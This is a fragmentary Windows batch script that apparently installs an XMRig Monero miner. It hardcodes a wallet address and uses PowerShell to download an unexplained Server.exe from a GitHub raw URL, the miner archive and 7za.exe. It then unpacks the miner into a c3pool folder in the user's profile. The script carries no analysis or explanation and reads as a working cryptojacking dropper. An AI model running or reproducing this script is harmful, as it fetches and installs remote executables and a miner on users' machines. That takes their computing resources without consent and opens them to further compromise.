...
set WALLET=47zcoJJs8eXZDYhhrvDBso3kWPVFoqtbZFM8ieB8zZ7cRGQFAT3FH8kMzvxETQaaTUM6kD5aCSU9cAm26Tyw5oV4VWTq795
...
powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/110099/cdn/master/Server.exe', '%USERPROFILE%\Server.exe')"
...
echo [*] Unpacking "%USERPROFILE%\xmrigsupportxmr.zip" to "%USERPROFILE%\c3pool"
powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrigsupportxmr.zip', '%USERPROFILE%\c3pool')"
if errorlevel 1 (
  echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://github.com/1753174725/xmrig/raw/main/7za.exe', '%USERPROFILE%\7za.exe')"
  if errorlevel 1 (
    echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
    exit /b 1
  )
  echo [*] Unpacking stock "%USERPROFILE%\xmrigsupportxmr.zip" to "%USERPROFILE%\c3pool"
  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\c3pool" "%USERPROFILE%\xmrigsupportxmr.zip" >NUL
  del "%USERPROFILE%\7za.exe"
)
del "%USERPROFILE%\xmrigsupportxmr.zip"
...
echo [*] Downloading "%MINER_LOCATION%" to "%USERPROFILE%\xmrigsupportxmr.zip"
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $wc.DownloadFile('%MINER_LOCATION%', '%USERPROFILE%\xmrigsupportxmr.zip')"
if errorlevel 1 (
  echo ERROR: Can't download "%MINER_LOCATION%" to "%USERPROFILE%\xmrigsupportxmr.zip"
  exit /b 1
)
...
if errorlevel 1 (
  ...
  echo [*] Unpacking advanced "%USERPROFILE%\xmrigsupportxmr.zip" to "%USERPROFILE%\c3pool"
  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\c3pool" "%USERPROFILE%\xmrigsupportxmr.zip" >NUL
  if errorlevel 1 (
    echo ERROR: Can't unpack "%USERPROFILE%\xmrigsupportxmr.zip" to "%USERPROFILE%\c3pool"
    exit /b 1
  )
  del "%USERPROFILE%\7za.exe"
)
